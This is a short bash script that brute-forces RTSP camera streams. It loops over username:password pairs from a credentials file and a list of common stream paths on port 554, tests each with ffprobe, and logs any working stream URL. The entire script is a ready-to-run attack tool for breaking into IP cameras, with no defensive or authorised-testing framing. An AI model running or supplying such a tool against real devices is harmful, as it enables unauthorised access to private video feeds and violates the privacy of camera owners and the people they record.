#!/bin/bash

###############################################################################
# RTSP CREDENTIAL & PATH BRUTE-FORCER
# ---------------------------------------------------------------------------
# Usage: ./rtsp_brute.sh <IP_ADDRESS>
###############################################################################

IP=$1
PORT=554
CREDS_FILE="camera_creds.txt"

if [ -z "$IP" ]; then
    echo "Usage: $0 <IP_ADDRESS>"
    exit 1
fi

if [ ! -f "$CREDS_FILE" ]; then
    echo "Error: $CREDS_FILE not found."
    exit 1
fi

# The path list from before
PATHS=("" "/live/ch0" "/stream1" "/Streaming/Channels/101" "/onvif-media-stream" "/live/main")

echo "--- Starting Deep Brute-Force on $IP ---"

# Nested loop: For every credential pair, try every common path
while IFS=: read -r USER PASS; do
    echo "Testing Credentials: $USER : $PASS"

    for path in "${PATHS[@]}"; do
        URL="rtsp://$USER:$PASS@$IP:$PORT$path"

        # -t 1: Faster timeout for credential checking
        if ffprobe -v error -t 1 "$URL" 2>/dev/null; then
            echo -e "\n\e[32m[!] SUCCESS FOUND [!]\e[0m"
            echo "URL: $URL"
            echo "------------------------------------------"

            # Log the success to your master details file
            echo "Valid RTSP Found: $URL" >> "./device_logs/credentials_found.log"
            exit 0
        fi
    done
done < "$CREDS_FILE"

echo "No valid credential/path combination found."
